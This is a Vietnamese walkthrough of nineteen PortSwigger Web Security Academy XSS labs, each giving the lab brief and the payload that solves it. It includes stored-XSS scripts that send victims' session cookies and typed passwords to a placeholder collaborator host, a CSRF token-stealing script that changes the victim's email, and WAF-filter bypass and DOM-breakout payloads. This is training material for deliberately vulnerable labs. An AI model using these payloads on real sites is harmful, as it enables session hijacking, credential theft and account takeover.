# [Portswigger] Cross-site scripting
***

## 1. Lab: Reflected XSS into HTML context with nothing encoded
* Content:
```
This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.

To solve the lab, perform a cross-site scripting attack that calls the alert function.
```
* Exploit:

<img width="379" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/40b02cef-ed0e-4437-a80a-534d4b0a8ab2">

<img width="227" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/7304d580-c21d-4aaa-b367-1a49c6b8abd6">

***

## 2. Lab: Exploiting cross-site scripting to steal cookies

* Content:
```
This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

Note
To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

Some users will notice that there is an alternative solution to this lab that does not require Burp Collaborator. However, it is far less subtle than exfiltrating the cookie.
```
* Exploit:

Post comment như sau:

```javascript
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

<img width="374" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/1a29c93e-410b-4981-ad59-ceaddca4a6b8">

Burp Collaborator đã log lại được comment body chứa cookie:

<img width="451" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/4a98f157-1034-46f7-8ba3-6d2adf4de7e4">

Dùng cookie này truy cập được vào phiên của admin. Lab Solved!

***

## 3. Lab: Exploiting cross-site scripting to capture passwords

* Content:
```
This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.

Note
To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

Some users will notice that there is an alternative solution to this lab that does not require Burp Collaborator. However, it is far less subtle than exfiltrating the credentials.
```
* Exploit:

Post comment nội dung như sau:

Payload:
```javascript
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

<img width="389" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/8a825082-958a-42ad-8c08-6d90320b5b26">

Nếu victim nhập thông tin vào thì sẽ bị gửi về server attacker:

<img width="422" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/a8977118-46ec-4c88-b509-22a612587c13">

Thu được thông tin user/pass của administrator:

<img width="448" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/7e5f5653-48a4-46e6-ba0c-399ee441c964">

Lab Solved!

***

## 4. Lab: Exploiting XSS to perform CSRF

* Content:
```
This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a CSRF attack and change the email address of someone who views the blog post comments.

You can log in to your own account using the following credentials: wiener:peter

Learning path
If you're following our suggested learning path, please note that this lab requires some understanding of topics that we haven't covered yet. Don't worry if you get stuck; try coming back later once you've developed your knowledge further.
```
* Exploit: 

Đăng nhập vào và check chức năng đổi mail => Sử dụng link `POST /my-account/change-email` với Data truyền vào là `email=wiener%40admin-user.net&csrf=smqFjQb05gI9NpKJ3xwDdifJ8fT1z5vM` 

<img width="373" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/6aa2cfe4-8cee-48cd-8b7a-d03ee8e453bd">

=> Data có bao gồm `token` => Vậy để khiến cho người dùng khác tự đổi password => Cần phải trigger cho user này vào link `/my-account` và bắt lại response chứa thông tin token => Đưa vào request thực hiện đổi Email.

<img width="482" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/bf4f73d5-db18-4837-882b-16f9d2a21fee">

Soạn nội dung comment như sau:
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

<img width="371" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/9f257b2e-8c2a-4e97-946d-59e21c2d90a9">

Lab Solved! => User nào thấy nội dung comment trên sẽ bị đổi email thành `test@test.com`

***

## 5. Lab: Reflected XSS into HTML context with most tags and attributes blocked
* Content:
```
This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.

To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the print() function.

Note
Your solution must not require any user interaction. Manually causing print() to be called in your own browser will not solve the lab.
```
* Exploit: 

Ban đầu thử truyền thẻ img vào tính năng search thấy bị chặn

<img width="474" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/bba85424-2af3-40a8-b7c3-8562edf70708">

Chuyển request sang Intruder và đặt Positions như sau:

<img width="585" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/831804af-e53e-4c76-9cca-25dc64d7f9e1">

Phần Payloads thì copy all tags từ trang cheat sheet (`https://portswigger.net/web-security/cross-site-scripting/cheat-sheet`)

<img width="579" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/d338b755-bba7-4b15-a1e1-7b9f27589aaa">

Paste vào phần simple list:

<img width="251" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/618c7545-aadf-46c5-9701-b86d2289b168">

Thực hiện Start attack

<img width="420" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/b36fc8c4-e010-4f72-a059-b8628d8e375d">

=> Phát hiện có thẻ `body` là không bị chặn.

Tiếp tục tìm xem Event handle nào bị chặn

Chỉnh Positions:

<img width="583" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/561156fe-cb4a-4550-a9c4-8359dc6c243e">

Copy phần Events trong Cheat Sheet vào phần Payloads. => Thực hiện Start Attack:

Xác định được ác Events sau không bị filter => Ta chọn sử dụng hàm `onresize`

<img width="423" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/b80a547e-d010-4648-a112-b571061c575c">

Sử dụng đoạn code sau trên Exploit Server

`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`

Deliver to victim => Lab Solved!

<img width="597" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/da3e1c91-33af-43b4-8c3b-a85f795d5295">

***

## 6. Lab: Reflected XSS into HTML context with all tags blocked except custom ones

* Content:
```
This lab blocks all HTML tags except custom ones.

To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts document.cookie.
```
* Exploit:

Làm như lab cũ, xác định thẻ `custom tags` không bị chặn

<img width="423" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/71de5b97-021e-4666-9bae-0a3dd43b338d">

Paste đoạn code sau lên Exploit Server

```javascript
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

Deliver to victim => Lab solved!

<img width="583" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/a26a8b16-44d2-4218-8149-4e0310d1316c">

***

## 7. Lab: Reflected XSS with event handlers and href attributes blocked

* Content:
```
This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor href attributes are blocked..

To solve the lab, perform a cross-site scripting attack that injects a vector that, when clicked, calls the alert function.

Note that you need to label your vector with the word "Click" in order to induce the simulated lab user to click your vector. For example:

<a href="">Click me</a>
```
* Exploit:

Tương tự Lab trước, xác định các thẻ sau không bị filter block

<img width="424" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/e3af6cf1-a911-4ed1-8e32-7fde86a60c3c">

Đầu bài yêu cầu ta phải click để trigger alert, ngoài ra không được dùng thuộc tính href => Sử dụng thẻ `svg`

Sử dụng Payload như sau:
`https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E`

Decode cho dễ đọc như sau:
`https://YOUR-LAB-ID.web-security-academy.net/?search=<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>`

Lab Solved!

<img width="586" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/825cbc2b-542d-4fd6-a804-222163dbb2c4">

***

## 8. Lab: Reflected XSS with some SVG markup allowed

* Content:
```
This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.

To solve the lab, perform a cross-site scripting attack that calls the alert() function.
```
* Exploit:

Tương tự lab trước, xác định các tags không bị blocks

<img width="426" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/5a5db289-ca46-4853-a5c4-e3b863773cd9">

=> Xác định thẻ `svg` không bị block.
Tiếp tục thay payload sau vào phần search trong Intruder để test xem Events nào không bị chặn

<img width="580" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/dd8e463b-2b71-4bed-84b6-8a75164a42ae">

Xác nhận thấy event `onbegin` không bị filter chặn

<img width="421" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/cbe8234a-00bb-4e1a-b0f8-ff70017e18be">

=> Sử dụng payload như sau:

`https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E`

Decode: 

`https://YOUR-LAB-ID.web-security-academy.net/?search="><svg><animatetransform onbegin=alert(1)>`

Lab Solved!

<img width="578" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/904a0330-1565-406f-bfd2-e92c3a6ae1ce">

***

## 9. Lab: Reflected XSS into attribute with angle brackets HTML-encoded

* Content:
```
This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function.
```
* Exploit:

Search và theo dõi Kết quả trả về hiển thị bên phía trình duyệt trong thẻ input

`<input type=text placeholder='Search the blog...' name=search value="ndkhai">`

<img width="481" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/f617e8bc-61d6-438d-98b7-4e65e07572cd">

=> Áp dụng payload tấn công như sau: 

`<input type=text placeholder='Search the blog...' name=search value="" onmouseover="alert(1)">`

LAB SOLVED!

<img width="563" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/36a636df-1bc8-42e3-b722-12a8212ebe4f">

***

## 10. Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded

* Content:
```
This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the comment author name is clicked.
```
* Exploit:

Thực hiện Post Comment => Trường website điền `ndkhai.com`

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/e154fb03-643e-4a09-917e-3f18b842f4e8)

Check source code xem nội dung `ndkhai.com` hiển thị ở vị trí nào => Thấy hiển thị trong thẻ href

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/19037da5-cf2c-40af-84e0-f847087e68e1)

Thực hiện post comment khác với nội dung trong `website` là `javascript:alert(1)`

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/a065d5bc-83dd-4291-b80e-6cc946b97bde)

LAB SOLVED!

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/440e9383-f8b2-411b-ba03-1ae262bfc8ee)

***

## 11. Lab: Reflected XSS in canonical link tag

* Content:
```
This lab reflects user input in a canonical link tag and escapes angle brackets.

To solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the alert function.

To assist with your exploit, you can assume that the simulated user will press the following key combinations:

ALT+SHIFT+X
CTRL+ALT+X
Alt+X
Please note that the intended solution to this lab is only possible in Chrome.
```
* Exploit:

Truy cập link payload sau: `https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)`

URL Decode: `https://YOUR-LAB-ID.web-security-academy.net/?'accesskey='x'onclick='alert(1)`

Nhấn Alt+X => LAB SOLVED!

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/7247517e-6e5f-4b0b-9974-d24786f31312)

***

## 12. Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped

* Content:
```
This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.

To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.
```
* Exploit:

Thực hiện search keywork `ndkhai`, quan sát trong source code

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/45f19e60-7aae-48ba-9c35-9dfab4b52981)

Thử payload `ndkhai'; alert(1)` => Thấy ký tự `'` bị escape:

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/63675120-aa64-4461-a2f6-fc6b9d9411c3)

Thử payload sau để thoát script cũ

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/58209569-bf1f-404c-ba61-0926bc1e4018)

LAB SOLVED!

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/d0530965-f866-40e9-8171-d5a99e345698)

***

## 13. Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded

* Content:
```
This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.
```
* Exploit:

Thử search `ndkhai` và quan sát trong source code

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/ecf9f8e6-4914-4a6a-aa47-b5b6647dbeff)

Dùng payload sau:

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/7e810f71-fa0f-4255-a109-8ab2748f8faf)

Source code trở thành

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/65645b29-e0ed-4876-bed3-91b73338a685)

LAB SOLVED

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/df744634-aef1-4af4-8552-d877085b9c04)

***

## 14. Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

* Content:
```
This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.

To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.
```
* Exploit:

Search với payload `ndkhai'123` => View Source code thấy dấu `'` đã bị escape:

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/476ec32e-8fe5-42c2-aa0d-2467bb64f30e)

Tuy nhiên test dấu '\' thì thấy ko bị escape

=> Áp dụng payload sau:

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/45d304ea-f73f-4f7f-9f9e-ab46cddedba8)

Source code trở thành:

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/6789f694-abbc-4e2e-a9f7-105897a9d518)

LAB SOLVED!

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/83dbfc1f-22ec-42c6-a668-182e4b85570a)

***

## 15. Lab: Reflected XSS in a JavaScript URL with some characters blocked

* Content:
```
This lab reflects your input in a JavaScript URL, but all is not as it seems. This initially seems like a trivial challenge; however, the application is blocking some characters in an attempt to prevent XSS attacks.

To solve the lab, perform a cross-site scripting attack that calls the alert function with the string 1337 contained somewhere in the alert message.
```
* Exploit:

Lab khó! 

1. Trước mắt cần tìm ra điểm bị Reflect XSS, từ Input => ánh xạ sang output phía trình duyệt

=> Nếu ta request link `https://0ae2000d033abece834cbf73003f00be.web-security-academy.net/post?postId=1&a=a` thì phần URL sẽ ánh xạ hiển thị trong trình duyệt (Phần link href "Back to Blog")

`<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d1%26a%3da'}).finally(_ => window.location = '/')">`

<img width="592" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/4582ff08-71a1-49ff-8bca-a05de0aaf863">

=> Đây chính là điểm để khai thác Reflect XSS.

2. Để thoát khỏi ngữ cảnh thì payload ban đầu truyền vào phải là `&'}`

3. Tiếp tục, phải tìm cách trigger alert nhưng hiện căp dấu ngoặc `()` đã bị chặn => Tham khảo các cách trigger mà ko cần dùng cặp dấu ngoặc ở link `https://stackoverflow.com/questions/35949554/invoking-a-function-without-parentheses`

=> Trong link trên có 1 cách là dùng ép kiểu toString

<img width="358" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/08800d63-5835-4711-8e5d-88a3b43c3e0a">

=> Như vậy nếu truyền vào `''+window` tức là sẽ gọi đến hàm toString của object `window`.

Tiếp tục tìm cách run hàm alert khi toString được gọi. Có thể sử dụng arrow function như sau:

`f=x=>{throw/**/onerror=alert,1337}` hoặc `f=x=>{{onerror=alert}throw/**/1337}`

Sau đó gán hàm `toString` vào `f` bằng cách `toString=f`

=> Payload lúc này sẽ trở thành `&'},f=x=>{throw/**/onerror=alert,1337},toString=f,''+window`

4. Bổ sung thêm phần sau vào payload để không làm break cấu trúc javascript ban đầu của code: `,{x:'`

=> Payload lúc này trở thành: `&'},f=x=>{throw/**/onerror=alert,1337},toString=f,''+window,{x:'`

5. Send Request with payload. LAB SOLVED!

<img width="593" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/b9bd2a53-005f-4bcf-9fd5-c341ba957c05">

Khi ấn vào link "Back to Blog" sẽ hiện alert 

<img width="294" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/0168a43b-8e56-4381-bd1f-29f78b5d4cbf">

***

## 16. Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

* Content:
```
This lab contains a stored cross-site scripting vulnerability in the comment functionality.

To solve this lab, submit a comment that calls the alert function when the comment author name is clicked.
```
* Exploit:

Vị trí bị dính lỗi Stored XSS là ở phần `Website` của chức năng Comment

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/cab930a6-e025-4b5b-9ec4-c41e51213f52)

Theo nội dung của đề bài thì cần bypass single quotes escaped => Ví dụ ta định sử dụng payload `http://ndkhai.com'-alert(document.domain)-'` thì payload sẽ trở thành `http://ndkhai.com&apos;-alert(document.domain)-&apos;`

Trong burpsuite, khi post comment thì dấu `&` của `&apos;` sẽ bị hiểu nhầm là ký tự ngăn cách parameters => cần URL Encode `&` thành `%26` => Payload trở thành: `http://ndkhai.com%26apos;-alert(document.domain)-%26apos;`

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/38f39bba-fd1b-479e-a267-99f3f1288d1f)

LAB SOLVED!

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/723112e0-e3fb-40f2-b85a-d323d53c14e9)


***

## 17. Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

* Content:
```
This lab contains a reflected cross-site scripting vulnerability in the search blog functionality. The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped. To solve this lab, perform a cross-site scripting attack that calls the alert function inside the template string.
```
* Exploit:

Vị trí chức năng search bị Reflected XSS, input truyền vào được hiển thị ra bên ngoài trình duyệt, có ngữ cảnh đặt bên trong backstick

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/d9728d18-bd0e-488e-a55b-ec4dc3e1ea3c)

Có thể truyền thẳng javascript vào trong `${}`

=> truyền payload `${alert(1)}` => LAB SOLVED!

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/d9ee6171-03f9-4a88-9b97-b25d24666a84)

***

## 18. Lab: DOM XSS in document.write sink using source location.search

* Content:
```
This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.

To solve this lab, perform a cross-site scripting attack that calls the alert function.
```
* Exploit:

Quan sát vị trí từ source -> sink ánh xạ vào trong thẻ `document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');` => Payload cần dùng `'">` để break out khỏi thẻ `img`
=> Payload cuối cùng như sau: `'"><script>alert(1)</script>`

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/bf3ae250-d0e8-4eed-bfac-d84a1de8d48b)

LAB SOLVED!

## 19. Lab: DOM XSS in document.write sink using source location.search inside a select element

* Content:
```
This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.

To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function.
```
* Exploit:

Source code trong trang product có đoạn mã javascript sau

<img width="393" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/b1adba8e-f382-4e27-9395-a4957ebdfb5e">

Code trên thực hiện tìm trong giá trị các parametter trên URL và tìm xem có parametter tên là `storeId` hay không. Nếu có thì sẽ đưa vào thẻ `Select` và hiển thị ra trình duyệt bằng `document.write`.

=> Cần breakout ra khỏi thẻ <select> và <option>

=> Payload: `aaa</option></select><script>alert(1)</script>`

LAB SOLVED!

<img width="237" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/23bb1dab-3586-45cd-a8df-241d2946a1fa">

<img width="577" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/9c142a50-1849-4a95-b0b9-031a10a4d9a3">

***

